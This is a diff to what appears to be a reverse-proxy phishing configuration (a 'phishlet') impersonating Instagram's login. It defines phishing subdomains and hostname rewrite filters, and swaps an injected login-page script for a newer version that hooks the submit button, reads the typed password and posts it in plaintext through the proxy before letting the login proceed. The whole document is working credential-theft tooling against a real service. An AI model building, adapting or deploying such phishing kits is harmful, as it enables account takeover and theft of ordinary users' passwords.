@@ -7,7 +7,6 @@ proxy_hosts:
   - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: false, is_landing: false}
 sub_filters:
   - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.instagram.com', orig_sub: 'graphql', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
@@ -31,19 +30,31 @@ js_inject:
     trigger_paths: ["/accounts/login"]
     trigger_params: []
     script: |
-      function onclickListener(){
-        var submit = document.querySelectorAll('button[type=submit]')[0];
-        submit.setAttribute("onclick", "sendPass()");
-        return;
-      }
-      function sendPass(){
-        var password = document.getElementsByName("password")[0].value;
-
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/accounts/login/ajax/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("unenc_password="+encodeURIComponent(password));
-
-        return;
-      }
-      setTimeout(function(){ onclickListener(); }, 1000);
+        let start = setInterval(function() {
+           if (document.querySelectorAll('form[id=loginForm]').length) {
+              clearInterval(start);
+              let subButton = document.querySelector('button[type=submit]')
+              let parent = subButton.parentElement
+              async function a(ev) {
+                  ev.stopPropagation();
+                  ev.preventDefault();
+                  if (!subButton.disabled) {
+                      var password = document.getElementsByName("password")[0].value;
+                      await fetch('/accounts/login/ajax/', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: "unenc_password=" + encodeURIComponent(password)});
+                      parent.removeEventListener('click', a, true);
+                      ev.target.click()
+                  }
+              }
+              parent.addEventListener("click", a, true);
+              new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.type == "attributes" && mutation.attributeName == "disabled" && mutation.target.disabled == true) {
+                        parent.removeEventListener('click', a, true);
+                        parent.addEventListener("click", a, true);
+                    }
+                });
+              }).observe(document.querySelector('button[type=submit]'), {
+                attributes: true //configure it to listen to attribute changes
+              });
+          }
+        }, 100);
